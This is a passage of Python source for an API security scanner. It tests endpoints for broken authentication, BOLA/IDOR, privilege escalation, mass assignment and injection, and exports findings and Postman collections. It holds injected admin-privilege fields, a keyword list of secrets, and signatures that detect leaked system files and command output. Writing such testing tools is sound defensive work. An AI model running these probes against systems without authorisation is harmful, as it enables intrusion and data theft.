                merged_req = merged.get('required', [])
                merged_req.extend(sub.get('required', []))
                merged['required'] = merged_req
            schema = merged
            expected_type = schema.get('type')

        if 'oneOf' in schema or 'anyOf' in schema:
            # Try each sub-schema, take the one with fewest violations
            sub_schemas = schema.get('oneOf', schema.get('anyOf', []))
            best_violations = None
            for sub in sub_schemas:
                if '$ref' in sub:
                    sub = self._resolve_ref(sub['$ref'])
                v = self._validate_schema(actual, sub, path)
                if best_violations is None or len(v) < len(best_violations):
                    best_violations = v
                if len(v) == 0:
                    return []
            return best_violations or []

        # Type check
        if expected_type and actual is not None:
            actual_type = self._get_json_type(actual)
            if actual_type != expected_type:
                # Allow integer where number is expected
                if not (expected_type == 'number' and actual_type == 'integer'):
                    violations.append({
                        'type': 'type_mismatch', 'path': path,
                        'expected': expected_type, 'actual': actual_type,
                    })
                    return violations  # No point checking deeper on wrong type

        # Object validation
        if expected_type == 'object' and isinstance(actual, dict):
            spec_props = schema.get('properties', {})
            required = schema.get('required', [])
            additional = schema.get('additionalProperties')

            # Check for extra fields not in spec
            for key in actual:
                if key not in spec_props:
                    if additional is False or (additional is None and spec_props):
                        violations.append({
                            'type': 'extra_field', 'path': f'{path}.{key}', 'field': key,
                        })
                    elif isinstance(additional, dict):
                        # additionalProperties has a schema
                        violations.extend(
                            self._validate_schema(actual[key], additional, f'{path}.{key}'))

            # Check required fields
            for req_field in required:
                if req_field not in actual:
                    violations.append({
                        'type': 'missing_required', 'path': f'{path}.{req_field}', 'field': req_field,
                    })

            # Recurse into known properties
            for prop_name, prop_schema in spec_props.items():
                if prop_name in actual:
                    violations.extend(
                        self._validate_schema(actual[prop_name], prop_schema, f'{path}.{prop_name}'))

        # Array validation
        elif expected_type == 'array' and isinstance(actual, list):
            items_schema = schema.get('items', {})
            for i, item in enumerate(actual[:10]):  # Limit to first 10 items
                violations.extend(
                    self._validate_schema(item, items_schema, f'{path}[{i}]'))

        return violations

    @staticmethod
    def _get_json_type(value: Any) -> str:
        if isinstance(value, bool):
            return 'boolean'
        if isinstance(value, int):
            return 'integer'
        if isinstance(value, float):
            return 'number'
        if isinstance(value, str):
            return 'string'
        if isinstance(value, list):
            return 'array'
        if isinstance(value, dict):
            return 'object'
        if value is None:
            return 'null'
        return 'unknown'

    # ==================================================================
    # EXISTING TEST MODULES (from v0.4, preserved)
    # ==================================================================
    def test_unauth(self, tags=None, methods=None):
        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info("[MODULE] Unauthenticated Access Testing (AuthZ Matrix)")
        self.logger.info(f"{'='*60}{Colors.END}")
        filtered = self._filter_endpoints(tags, methods)
        matrix = []
        for ep in filtered:
            ep_str = f"{ep['method']} {ep['path']}"
            resp_auth = self.send_request(ep, auth_mode='primary')
            resp_noauth = self.send_request(ep, auth_mode='none')
            auth_status = resp_auth.status_code if resp_auth else 'ERR'
            noauth_status = resp_noauth.status_code if resp_noauth else 'ERR'
            matrix.append({'endpoint': ep_str, 'auth_status': auth_status,
                           'noauth_status': noauth_status, 'tags': ep['tags']})
            if isinstance(noauth_status, int) and 200 <= noauth_status < 300:
                if ep['security']:
                    self._add_finding('HIGH', 'BROKEN_AUTH', ep_str,
                                      f'Endpoint accessible without authentication (HTTP {noauth_status})',
                                      f'Spec requires auth but returns {noauth_status} without credentials.')
                else:
                    self._add_finding('INFO', 'NO_AUTH_REQUIRED', ep_str,
                                      f'No security requirement in spec (HTTP {noauth_status})',
                                      'Verify this is intentional.')
            if (resp_auth and resp_noauth
                    and isinstance(noauth_status, int) and 200 <= noauth_status < 300
                    and isinstance(auth_status, int) and 200 <= auth_status < 300):
                sd = abs(len(resp_auth.content) - len(resp_noauth.content))
                if sd > 0:
                    self.logger.info(f"  {Colors.WARNING}[!] Size delta: auth={len(resp_auth.content)}B "
                                     f"noauth={len(resp_noauth.content)}B (Δ{sd}B){Colors.END}")
        self.logger.info(f"\n{Colors.BOLD}AuthZ Matrix:{Colors.END}")
        self.logger.info(f"  {'Endpoint':<45} {'Auth':>6} {'NoAuth':>8} {'Tags'}")
        self.logger.info(f"  {'-'*45} {'-'*6} {'-'*8} {'-'*20}")
        for r in matrix:
            na = r['noauth_status']
            c = Colors.FAIL if (isinstance(na, int) and 200 <= na < 300) else Colors.GREEN
            self.logger.info(f"  {r['endpoint']:<45} {r['auth_status']:>6} "
                             f"{c}{na:>8}{Colors.END} {', '.join(r['tags'])}")
        return matrix

    def test_bola(self, tags=None, methods=None):
        if not self.jwt_secondary:
            self.logger.error(f"{Colors.FAIL}[!] BOLA test requires --jwt-secondary{Colors.END}")
            return
        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info("[MODULE] BOLA/IDOR Testing")
        self.logger.info(f"{'='*60}{Colors.END}")
        filtered = self._filter_endpoints(tags, methods)
        id_eps = [ep for ep in filtered if any(self._is_id_param(p) for p in ep['parameters'])]
        for ep in id_eps:
            ep_str = f"{ep['method']} {ep['path']}"
            r1 = self.send_request(ep, auth_mode='primary')
            r2 = self.send_request(ep, auth_mode='secondary')
            if r1 and r2:
                s1, s2 = r1.status_code, r2.status_code
                if 200 <= s2 < 300 and 200 <= s1 < 300:
                    self._add_finding('HIGH', 'BOLA/IDOR', ep_str,
                                      'User2 can access User1 resource',
                                      f'Both return 2xx. Similarity: {self._body_similarity(r1, r2):.0%}')

    def test_bfla(self, tags=None, methods=None):
        if not self.jwt_secondary:
            self.logger.error(f"{Colors.FAIL}[!] BFLA test requires --jwt-secondary{Colors.END}")
            return
        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info("[MODULE] BFLA Testing")
        self.logger.info(f"{'='*60}{Colors.END}")
        admin_kw = ['admin', 'manage', 'internal', 'config', 'settings', 'role', 'permission']
        filtered = self._filter_endpoints(tags, methods)
        suspect = [ep for ep in filtered if (
            ep['method'] in ('POST', 'PUT', 'PATCH', 'DELETE')
            or any(any(kw in t.lower() for kw in admin_kw) for t in ep['tags'])
            or any(kw in ep['path'].lower() for kw in admin_kw))]
        for ep in suspect:
            ep_str = f"{ep['method']} {ep['path']}"
            resp = self.send_request(ep, auth_mode='secondary')
            if resp and 200 <= resp.status_code < 300:
                self._add_finding('CRITICAL', 'BFLA', ep_str,
                                  f'Low-priv user can access admin endpoint ({resp.status_code})', '')
            elif resp and resp.status_code not in (401, 403):
                self._add_finding('LOW', 'BFLA', ep_str,
                                  f'Unexpected status {resp.status_code} for low-priv user', '')

    def test_method_tampering(self, tags=None, methods=None):
        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info("[MODULE] HTTP Method Tampering")
        self.logger.info(f"{'='*60}{Colors.END}")
        all_m = {'GET', 'POST', 'PUT', 'PATCH', 'DELETE'}
        path_methods = defaultdict(set)
        for ep in self.endpoints:
            path_methods[ep['path']].add(ep['method'])
        tested = set()
        for ep in self._filter_endpoints(tags, methods):
            if ep['path'] in tested: continue
            tested.add(ep['path'])
            undefined = all_m - path_methods[ep['path']]
            if not undefined: continue
            req = self._build_request(ep)
            url = req['url']
            for m in sorted(undefined):
                resp = self._send_raw(m, url)
                if resp and 200 <= resp.status_code < 300:
                    self._add_finding('MEDIUM', 'METHOD_TAMPERING', f"{m} {ep['path']}",
                                      f'Undocumented {m} returns {resp.status_code}', '')

    def test_mass_assignment(self, tags=None, methods=None):
        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info("[MODULE] Mass Assignment / Excessive Data Exposure")
        self.logger.info(f"{'='*60}{Colors.END}")
        extra = {'role': 'admin', 'is_admin': True, 'isAdmin': True, 'admin': True,
                 'permissions': ['*'], 'privilege': 'superuser', 'verified': True, 'is_staff': True}
        sensitive = ['password', 'secret', 'token', 'api_key', 'ssn', 'credit_card',
                     'private_key', 'session', 'hash', 'salt', 'otp', 'mfa']
        for ep in self._filter_endpoints(tags, methods):
            ep_str = f"{ep['method']} {ep['path']}"
            if ep['method'] in ('POST', 'PUT', 'PATCH') and ep['request_body']:
                body = ep['request_body'].get('sample')
                if isinstance(body, dict):
                    injected = {**body, **extra}
                    req = self._build_request(ep)
                    resp = self._send_raw(ep['method'], req['url'], req.get('headers'), json_body=injected)
                    if resp and 200 <= resp.status_code < 300:
                        try:
                            rj = json.dumps(resp.json())
                            reflected = [k for k in extra if k in rj]
                            if reflected:
                                self._add_finding('HIGH', 'MASS_ASSIGNMENT', ep_str,
                                                  f'Injected fields reflected: {reflected}', '')
                        except Exception: pass
            if ep['method'] == 'GET':
                resp = self.send_request(ep)
                if resp and 200 <= resp.status_code < 300:
                    body_str = resp.text.lower()
                    found = [p for p in sensitive if p in body_str]
                    if found:
                        self._add_finding('MEDIUM', 'DATA_EXPOSURE', ep_str,
                                          f'Sensitive fields in response: {found}', '')

    def fuzz_endpoints(self, tags=None, methods=None, categories=None):
        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info("[MODULE] Injection Fuzzing")
        self.logger.info(f"{'='*60}{Colors.END}")
        if categories is None:
            categories = ['sqli', 'xss', 'ssti', 'path_traversal', 'cmdi']
        for ep in self._filter_endpoints(tags, methods):
            ep_str = f"{ep['method']} {ep['path']}"
            fuzz_params = [p for p in ep['parameters']
                           if p.get('schema', {}).get('type', 'string') == 'string'
                           and p.get('in') in ('query', 'path', 'header')]
            fuzz_body = []
            if ep['request_body'] and isinstance(ep['request_body'].get('sample'), dict):
                fuzz_body = [k for k, v in ep['request_body']['sample'].items() if isinstance(v, str)]
            if not fuzz_params and not fuzz_body: continue
            baseline = self.send_request(ep)
            bs, bsz, bt = (baseline.status_code if baseline else None,
                           len(baseline.content) if baseline else 0,
                           baseline.elapsed.total_seconds() if baseline else 0)
            for cat in categories:
                for payload in FUZZ_PAYLOADS.get(cat, []):
                    for p in fuzz_params:
                        fep = copy.deepcopy(ep)
                        for fp in fep['parameters']:
                            if fp['name'] == p['name'] and fp['in'] == p['in']:
                                fp['sample'] = payload; break
                        r = self.send_request(fep)
                        self._analyze_fuzz(r, bs, bsz, bt, cat, payload, ep_str, f"param:{p['name']}")
                    for bk in fuzz_body:
                        fep = copy.deepcopy(ep)
                        if isinstance(fep['request_body']['sample'], dict):
                            fep['request_body']['sample'][bk] = str(payload)
                        r = self.send_request(fep)
                        self._analyze_fuzz(r, bs, bsz, bt, cat, payload, ep_str, f"body:{bk}")

    def _analyze_fuzz(self, resp, bs, bsz, bt, cat, payload, endpoint, loc):
        if not resp: return
        status, body = resp.status_code, resp.text[:5000]
        elapsed = resp.elapsed.total_seconds()
        findings = []
        if cat == 'sqli':
            for sig in ['sql syntax', 'mysql', 'postgresql', 'sqlite', 'oracle',
                         'unclosed quotation', 'syntax error', 'ORA-', 'PG::']:
                if sig.lower() in body.lower():
                    findings.append(('HIGH', f'SQL error: "{sig}"')); break
            if elapsed > bt + 4.5 and bt < 2:
                findings.append(('HIGH', f'Time-based: {elapsed:.1f}s vs {bt:.1f}s'))
        if cat == 'xss' and str(payload) in body:
            findings.append(('MEDIUM', 'XSS reflected'))
        if cat == 'ssti':
            for ind in ['49', 'config', '__class__']:
                if ind in body and ind not in str(payload):
                    findings.append(('HIGH', f'SSTI indicator: {ind}')); break
        if cat == 'path_traversal' and ('root:' in body or '[fonts]' in body):
            findings.append(('CRITICAL', 'File content in response'))
        if cat == 'cmdi' and ('uid=' in body or 'gid=' in body):
            findings.append(('CRITICAL', 'OS command output'))
        if status == 500 and bs != 500:
            findings.append(('MEDIUM', f'500 triggered with {cat}'))
        for sev, detail in findings:
            self._add_finding(sev, f'INJECTION_{cat.upper()}', endpoint,
                              f'{cat.upper()} at {loc}: {detail}',
                              f'Payload: {str(payload)[:100]} | Status: {status}')

    def test_rate_limit(self, tags=None, methods=None, burst: int = 20):
        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info(f"[MODULE] Rate Limiting (burst={burst})")
        self.logger.info(f"{'='*60}{Colors.END}")
        for ep in self._filter_endpoints(tags, methods)[:5]:
            ep_str = f"{ep['method']} {ep['path']}"
            req = self._build_request(ep)
            statuses = []
            for _ in range(burst):
                try: statuses.append(requests.request(**req).status_code)
                except: statuses.append(0)
            if not any(s == 429 for s in statuses) and not any(s == 403 for s in statuses[5:]):
                self._add_finding('LOW', 'RATE_LIMITING', ep_str,
                                  f'No rate limiting after {burst} requests', f'Statuses: {set(statuses)}')

    def test_security_headers(self, tags=None, methods=None):
        self.logger.info(f"\n{Colors.MAGENTA}{'='*60}")
        self.logger.info("[MODULE] Security Headers")
        self.logger.info(f"{'='*60}{Colors.END}")
        missing_g, leak_g = set(), {}
        for ep in self._filter_endpoints(tags, methods)[:3]:
            resp = self.send_request(ep)
            if not resp: continue
            rh = {k.lower(): v for k, v in resp.headers.items()}
            for h in SECURITY_HEADERS:
                if h.lower() not in rh: missing_g.add(h)
            for h in INFO_LEAK_HEADERS:
                if h.lower() in rh: leak_g[h] = rh[h.lower()]
            acao = rh.get('access-control-allow-origin')
            if acao == '*':
                self._add_finding('MEDIUM', 'CORS', f"{ep['method']} {ep['path']}",
                                  'Wildcard CORS: Access-Control-Allow-Origin: *', '')
            if (rh.get('access-control-allow-credentials', '').lower() == 'true'
                    and acao and acao != 'null'):
                self._add_finding('HIGH', 'CORS', f"{ep['method']} {ep['path']}",
                                  'CORS credentials with origin reflection', f'Origin: {acao}')
        if missing_g:
            self._add_finding('LOW', 'SECURITY_HEADERS', 'Global',
                              f'Missing: {sorted(missing_g)}', '')
        if leak_g:
            self._add_finding('LOW', 'INFO_LEAKAGE', 'Global',
                              f'Info headers: {leak_g}', '')

    # ==================================================================
    # Original operational methods
    # ==================================================================
    def run_all(self, tags=None, methods=None):
        results = {'total': 0, 'success': 0, 'client_error': 0, 'server_error': 0, 'failed': 0, 'responses': []}
        filtered = self._filter_endpoints(tags, methods)
        self.logger.info(f"\n{Colors.HEADER}{'='*60}")
        self.logger.info(f"{TOOL_NAME} v{__version__} - Scanning {len(filtered)} endpoints")
        self.logger.info(f"Target: {self.base_url}")
        self.logger.info(f"{'='*60}{Colors.END}")
        for ep in filtered:
            results['total'] += 1
            r = self.send_request(ep)
            if r is None: results['failed'] += 1
            elif 200 <= r.status_code < 300: results['success'] += 1
            elif 400 <= r.status_code < 500: results['client_error'] += 1
            else: results['server_error'] += 1
            results['responses'].append({
                'endpoint': f"{ep['method']} {ep['path']}",
                'status': r.status_code if r else None,
                'time': r.elapsed.total_seconds() if r else None})
        self.logger.info(f"\n{Colors.HEADER}Summary{Colors.END}")
        self.logger.info(f"  {Colors.GREEN}2xx: {results['success']}{Colors.END}  "
                         f"{Colors.WARNING}4xx: {results['client_error']}{Colors.END}  "
                         f"{Colors.FAIL}5xx: {results['server_error']}{Colors.END}  "
                         f"Fail: {results['failed']}  Total: {results['total']}")
        return results

    def list_endpoints(self):
        self.logger.info(f"\n{Colors.HEADER}Endpoints ({self.spec_path}):{Colors.END}")
        mc = {'GET': Colors.GREEN, 'POST': Colors.BLUE, 'PUT': Colors.WARNING,
              'PATCH': Colors.WARNING, 'DELETE': Colors.FAIL, 'HEAD': Colors.CYAN, 'OPTIONS': Colors.CYAN}
        counts = defaultdict(int)
        for i, ep in enumerate(self.endpoints, 1):
            counts[ep['method']] += 1
            c = mc.get(ep['method'], Colors.END)
            sec = ' 🔒' if ep['security'] else ' 🔓'
            dep = f" {Colors.WARNING}[DEPR]{Colors.END}" if ep.get('deprecated') else ''
            self.logger.info(f"  {i:3}. {c}{ep['method']:7}{Colors.END} {ep['path']}{sec}{dep}")
            if ep['summary']:
                self.logger.info(f"       {Colors.CYAN}{ep['summary']}{Colors.END}")
        self.logger.info(f"\n{Colors.BOLD}Methods:{Colors.END} " +
                         '  '.join(f"{m}:{counts[m]}" for m in ['GET','POST','PUT','PATCH','DELETE','HEAD','OPTIONS'] if counts[m]))
        ac = sum(1 for e in self.endpoints if e['security'])
        self.logger.info(f"  🔒 Auth: {ac}  🔓 Public: {len(self.endpoints) - ac}")

    # ------------------------------------------------------------------
    # Export methods
    # ------------------------------------------------------------------
    def export_requests(self, output_file: str):
        data = []
        for ep in self.endpoints:
            req = self._build_request(ep)
            data.append({
                'operation_id': ep['operation_id'], 'method': req['method'],
                'url': req['url'], 'headers': req.get('headers', {}),
                'params': req.get('params'), 'body': req.get('json') or req.get('data'),
                'tags': ep['tags'], 'summary': ep['summary'], 'security': ep['security']})
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)
        self.logger.info(f"{Colors.GREEN}[+] Exported {len(data)} requests → {output_file}{Colors.END}")

    def export_postman(self, output_file: str):
        self.logger.info(f"\n{Colors.HEADER}Exporting Postman collection{Colors.END}")
        tag_items = defaultdict(list)
        path_vars = set()
        for ep in self.endpoints:
            req = self._build_request(ep)
            raw_path = ep['path']
            for p in ep['parameters']:
                if p.get('in') == 'path' and p.get('name'):
                    path_vars.add(p['name'])
                    raw_path = raw_path.replace(f'{{{p["name"]}}}', f'{{{{{p["name"]}}}}}')
            raw_url = ("{{baseUrl}}" + raw_path) if raw_path.startswith('/') else ("{{baseUrl}}/" + raw_path)
            params = req.get('params') or {}
            if params: raw_url = f"{raw_url}?{urlencode(params, doseq=True)}"
            hdrs = [{"key": "Authorization", "value": "Bearer {{jwt}}", "type": "text"}
                    if k.lower() == 'authorization'
                    else {"key": k, "value": str(v), "type": "text"}
                    for k, v in (req.get('headers') or {}).items()]
            body = None
            if 'json' in req:
                body = {"mode": "raw", "raw": json.dumps(req['json'], indent=2),
                        "options": {"raw": {"language": "json"}}}
            item = {"name": f"{ep['method']} {ep['path']}",
                    "request": {"method": ep['method'], "header": hdrs, "url": raw_url,
                                "description": ep.get('summary', '')}, "response": []}
            if body: item["request"]["body"] = body
            tag_items[ep['tags'][0] if ep['tags'] else '_Untagged'].append(item)
        coll_items = [{"name": t, "item": items} for t, items in sorted(tag_items.items())]
        variables = [{"key": "baseUrl", "value": self.base_url, "type": "string"}]
        if self.jwt: variables.append({"key": "jwt", "value": self.jwt, "type": "string"})
        if self.jwt_secondary: variables.append({"key": "jwt_secondary", "value": self.jwt_secondary, "type": "string"})
        if self.api_key: variables.append({"key": "apiKey", "value": self.api_key, "type": "string"})
        for v in sorted(path_vars): variables.append({"key": v, "value": "", "type": "string"})
        collection = {
            "info": {"name": f"{TOOL_NAME} - {self.spec_path.name}", "_postman_id": str(uuid.uuid4()),
                     "description": f"Generated by {TOOL_NAME} v{__version__}",
                     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"},
            "item": coll_items, "variable": variables}
        with open(output_file, 'w') as f:
            json.dump(collection, f, indent=2)
        self.logger.info(f"{Colors.GREEN}[+] Postman collection → {output_file} "
                         f"({sum(len(v) for v in tag_items.values())} items){Colors.END}")

    # ------------------------------------------------------------------
    # Findings report
    # ------------------------------------------------------------------
    def print_findings_report(self):
        if _HAS_RICH:
            render_findings(_Console(), self.findings)
            return
        # Plain-ANSI fallback when rich is unavailable.
        if not self.findings:
            self.logger.info(f"\n{Colors.GREEN}[+] No security findings{Colors.END}")
            return
        sf = sorted(self.findings, key=lambda f: _SEV_ORDER.get(f['severity'], 99))
        self.logger.info(f"\n  {BOLT} {TOOL_NAME} findings ({len(sf)} total)")
        sc = {'CRITICAL': Colors.FAIL, 'HIGH': Colors.WARNING, 'MEDIUM': Colors.WARNING,
              'LOW': Colors.CYAN, 'INFO': Colors.DIM}
        for i, f in enumerate(sf, 1):
            self.logger.info(f"  {sc.get(f['severity'], '')}[{f['severity']}]{Colors.END} "
                             f"{f['category']}  {f['title']}  ({f['endpoint']})")

    def export_findings_json(self, output_file: str):
        with open(output_file, 'w') as f:
            json.dump({'tool': TOOL_NAME, 'version': __version__,
                       'scan_date': datetime.now().isoformat(),
                       'target': self.base_url, 'spec': str(self.spec_path),
                       'total_findings': len(self.findings),
                       'findings': self.findings}, f, indent=2)
        self.logger.info(f"{Colors.GREEN}[+] Findings JSON -> {output_file}{Colors.END}")

    def export_report_md(self, output_file: str):
        with open(output_file, 'w') as f:
            f.write(render_markdown(self.findings, _report_meta(self)))
        self.logger.info(f"{Colors.GREEN}[+] Markdown report -> {output_file}{Colors.END}")

    def export_report_html(self, output_file: str):
        with open(output_file, 'w') as f:
            f.write(render_html(self.findings, _report_meta(self)))
        self.logger.info(f"{Colors.GREEN}[+] HTML report -> {output_file}{Colors.END}")



# ===================================================================
# Interactive Mode
# ===================================================================

# Body length threshold: <= INLINE_FIELD_LIMIT fields → inline prompts,
# > INLINE_FIELD_LIMIT fields → open $EDITOR
INLINE_FIELD_LIMIT = 3


class InteractiveMode:
    """
    Full-terminal interactive API testing session.

    Navigation:
        Type to filter endpoints live (matches method + path anywhere)
        Up/Down or j/k to move selection
        Enter to select and send
        Ctrl+C / q at the endpoint list to quit

    Per-endpoint sub-menu (after a response):
        R  Resend as-is
        E  Edit request (body/headers/params) and resend
        S  Switch auth context (primary / secondary / none)
        H  Toggle full headers view
        B  Toggle full body view
        J  Run JWT manipulation attacks on this endpoint
        F  Fuzz this endpoint (all injection categories)
        C  Content-Type confusion on this endpoint
        A  Auth matrix - send once auth, once unauth, diff them
        N  Back to endpoint list
        Q  Quit interactive mode
    """

    HIDE_CURSOR = '\033[?25l'
    SHOW_CURSOR = '\033[?25h'

    _METHOD_COLOR = {
        'GET': Colors.GREEN, 'POST': Colors.BLUE,
        'PUT': Colors.WARNING, 'PATCH': Colors.WARNING,
        'DELETE': Colors.FAIL, 'HEAD': Colors.CYAN, 'OPTIONS': Colors.CYAN,
    }

    def __init__(self, engine):
        self.engine    = engine
        self.endpoints = engine.endpoints
        self.filtered  = list(self.endpoints)
        self.query     = ''
        self.cursor    = 0
        self.auth_mode = 'primary'
        self.show_headers   = False
        self.show_full_body = False
        self._editor = (os.environ.get('EDITOR')
                        or shutil.which('nano')
                        or shutil.which('vi')
                        or 'vi')
        self._cols, self._rows = shutil.get_terminal_size(fallback=(120, 40))
        self._log_prefix = '[INTERACTIVE]'

    # ------------------------------------------------------------------
    # Low-level terminal
    # ------------------------------------------------------------------
    @staticmethod
    def _getch():
        """Read one keypress; handles arrow-key escape sequences."""
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            ch = sys.stdin.read(1)
            if ch == '\x1b':
                ch2 = sys.stdin.read(1)
                if ch2 == '[':
                    ch3 = sys.stdin.read(1)
                    return '\x1b[' + ch3
                return ch2
            return ch
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

    @staticmethod
    def _clear():
        os.system('clear')

    @staticmethod
    def _pr(text='', end='\n'):
        sys.stdout.write(text + end)
        sys.stdout.flush()

    def _hr(self, char='─', color=Colors.DIM):
        return f"{color}{char * min(self._cols, 80)}{Colors.END}"

    # ------------------------------------------------------------------
    # Endpoint list with live filter
    # ------------------------------------------------------------------
    def _label(self, ep):
        mc  = self._METHOD_COLOR.get(ep['method'], Colors.END)
        sec = '🔒' if ep['security'] else '🔓'
        tag = (f" {Colors.DIM}[{ep['tags'][0]}]{Colors.END}") if ep['tags'] else ''
        summ = (f"  {Colors.DIM}{ep['summary'][:40]}…{Colors.END}"
                if len(ep['summary']) > 40
                else (f"  {Colors.DIM}{ep['summary']}{Colors.END}" if ep['summary'] else ''))
        return f"  {mc}{ep['method']:7}{Colors.END} {ep['path']}{sec}{tag}{summ}"

    def _apply_filter(self):
        q = self.query.lower()
        self.filtered = (
            list(self.endpoints) if not q
            else [ep for ep in self.endpoints
                  if q in ep['method'].lower()
                  or q in ep['path'].lower()
                  or q in ' '.join(ep['tags']).lower()
                  or q in ep['summary'].lower()]
        )
        self.cursor = min(self.cursor, max(0, len(self.filtered) - 1))

    def _draw_list(self):
        self._clear()
        self._pr(f"{Colors.BOLD}{Colors.BLUE}⚡  APIvolt: Interactive Mode{Colors.END}  "
                 f"{Colors.DIM}{self.engine.base_url}{Colors.END}")
        self._pr(f"  {Colors.DIM}auth:[{self.auth_mode}]  "
                 f"{len(self.filtered)}/{len(self.endpoints)} endpoints{Colors.END}")
        self._pr(self._hr())

        max_vis = max(5, self._rows - 9)
        start   = max(0, self.cursor - max_vis // 2)
        end     = min(len(self.filtered), start + max_vis)
        start   = max(0, end - max_vis)

        if not self.filtered:
            self._pr(f"  {Colors.DIM}No endpoints match '{self.query}'{Colors.END}")
        else:
            for i in range(start, end):
                ep     = self.filtered[i]
                prefix = (f"{Colors.BOLD}▶ {i+1:3}.{Colors.END}"
                          if i == self.cursor else f"  {i+1:3}.")
                self._pr(f"{prefix}{self._label(ep)}")

        self._pr(self._hr())
        pc = Colors.CYAN if self.query else Colors.DIM
        self._pr(f"  {pc}Filter:{Colors.END} {self.query}▌  "
                 f"{Colors.DIM}↑↓/jk move  Enter select  Ctrl+C quit{Colors.END}")

    def pick_endpoint(self):
        """Live-filter endpoint picker. Returns selected ep dict or None."""
        self.query  = ''
        self.cursor = 0
        self._apply_filter()

        while True:
            self._draw_list()
            ch = self._getch()

            if ch in ('\x03', 'q', 'Q'):
                return None
            elif ch in ('\r', '\n'):
                return self.filtered[self.cursor] if self.filtered else None
            elif ch in ('\x1b[A', 'k'):          # Up
                self.cursor = max(0, self.cursor - 1)
            elif ch in ('\x1b[B', 'j'):          # Down
                self.cursor = min(max(0, len(self.filtered) - 1), self.cursor + 1)
            elif ch in ('\x7f', '\x08'):          # Backspace
                self.query = self.query[:-1]
                self._apply_filter()
            elif ch.isprintable() and len(ch) == 1:
                self.query += ch
                self._apply_filter()

    # ------------------------------------------------------------------
    # Request editing
    # ------------------------------------------------------------------
    def _read_line(self, prompt, default=''):
        """Read a line in cooked mode (supports readline editing)."""
        self._pr(prompt, end='')
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        termios.tcsetattr(fd, termios.TCSADRAIN, old)   # restore cooked
        try:
            val = input()
            return val if val.strip() else default
        except (EOFError, KeyboardInterrupt):
            return default

    def _edit_inline(self, label, current):
        """Prompt for a single field value inline. Returns updated value."""
        cur_s = json.dumps(current) if not isinstance(current, str) else str(current)
        raw = self._read_line(
            f"  {Colors.CYAN}{label}{Colors.END} [{Colors.DIM}{cur_s[:60]}{Colors.END}]: ",
            default='')
        if not raw:
            return current
        try:
            return json.loads(raw)
        except (json.JSONDecodeError, ValueError):
            return raw

    def _edit_in_editor(self, data):
        """Open $EDITOR for complex bodies. Returns updated data or original."""
        with tempfile.NamedTemporaryFile(
                mode='w', suffix='.json', delete=False, prefix='apivolt_') as f:
            json.dump(data, f, indent=2)
            fname = f.name
        try:
            subprocess.call([self._editor, fname])
            with open(fname) as f:
                return json.loads(f.read())
        except Exception as e:
            self._pr(f"  {Colors.FAIL}Editor error: {e}{Colors.END}")
            return data
        finally:
            try:
                os.unlink(fname)
            except OSError:
                pass

    def _edit_endpoint(self, ep):
        """Return a deep-copy of ep with user-edited fields."""
        ep = copy.deepcopy(ep)
        self._clear()
        self._pr(f"{Colors.BOLD}Edit: {ep['method']} {ep['path']}{Colors.END}")
        self._pr(self._hr())

        for p in ep['parameters']:
            if p['in'] in ('path', 'query', 'header'):
                p['sample'] = self._edit_inline(
                    f"[{p['in']}] {p['name']}", p['sample'])

        if ep['request_body']:
            sample   = ep['request_body'].get('sample')
            n_fields = len(sample) if isinstance(sample, dict) else 1
            self._pr(f"  {Colors.BOLD}Body ({ep['request_body']['content_type']}):{Colors.END}")
            if isinstance(sample, dict) and n_fields <= INLINE_FIELD_LIMIT:
                for key in list(sample.keys()):
                    sample[key] = self._edit_inline(f"  {key}", sample[key])
                ep['request_body']['sample'] = sample
            else:
                self._pr(f"  {Colors.DIM}Body has {n_fields} fields, opening {self._editor}...{Colors.END}")
                ep['request_body']['sample'] = self._edit_in_editor(sample)

        return ep

    # ------------------------------------------------------------------
    # Response rendering
    # ------------------------------------------------------------------
    def _render_response(self, resp, auth_label=''):
        status = resp.status_code
        sc = (Colors.GREEN  if 200 <= status < 300 else
              Colors.BLUE   if 300 <= status < 400 else
              Colors.WARNING if 400 <= status < 500 else Colors.FAIL)

        ct      = resp.headers.get('Content-Type', '').split(';')[0].strip()
        elapsed = resp.elapsed.total_seconds()
        size    = len(resp.content)
        al      = f"  {Colors.DIM}[{auth_label}]{Colors.END}" if auth_label else ''

        self._pr(f"\n  {sc}● {status} {resp.reason}{Colors.END}"
                 f"  {elapsed:.3f}s  {size}B  {Colors.DIM}{ct}{Colors.END}{al}")

        # Headers
        if self.show_headers:
            self._pr(f"  {Colors.BOLD}Headers:{Colors.END}")
            for k, v in resp.headers.items():
                self._pr(f"    {Colors.DIM}{k}:{Colors.END} {v}")
        else:
            NOTABLE = {'content-type', 'content-length', 'location',
                       'www-authenticate', 'x-ratelimit-remaining',
                       'access-control-allow-origin', 'set-cookie',
                       'x-powered-by', 'server'}
            notable = [(k, v) for k, v in resp.headers.items()
                       if k.lower() in NOTABLE]
            if notable:
                self._pr('  ' + Colors.DIM +
                         '  '.join(f"{k}: {v[:40]}" for k, v in notable[:4]) +
                         Colors.END)

        # Body
        try:
            body_str = json.dumps(resp.json(), indent=2)
        except (json.JSONDecodeError, ValueError):
            body_str = resp.text

        lines = body_str.splitlines()
        limit = None if self.show_full_body else 40
        for line in (lines if limit is None else lines[:limit]):
            self._pr(f"    {line}")
        if limit and len(lines) > limit:
            self._pr(f"  {Colors.DIM}… {len(lines) - limit} more lines (press B){Colors.END}")

    # ------------------------------------------------------------------
    # Sub-menu
    # ------------------------------------------------------------------
    _MENU = None   # built lazily

    def _draw_menu(self):
        self._pr(self._hr())
        self._pr(
            f"  {Colors.BOLD}[R]{Colors.END}esend  "
            f"{Colors.BOLD}[E]{Colors.END}dit+resend  "
            f"{Colors.BOLD}[S]{Colors.END}witch auth  "
            f"{Colors.BOLD}[H]{Colors.END}eaders  "
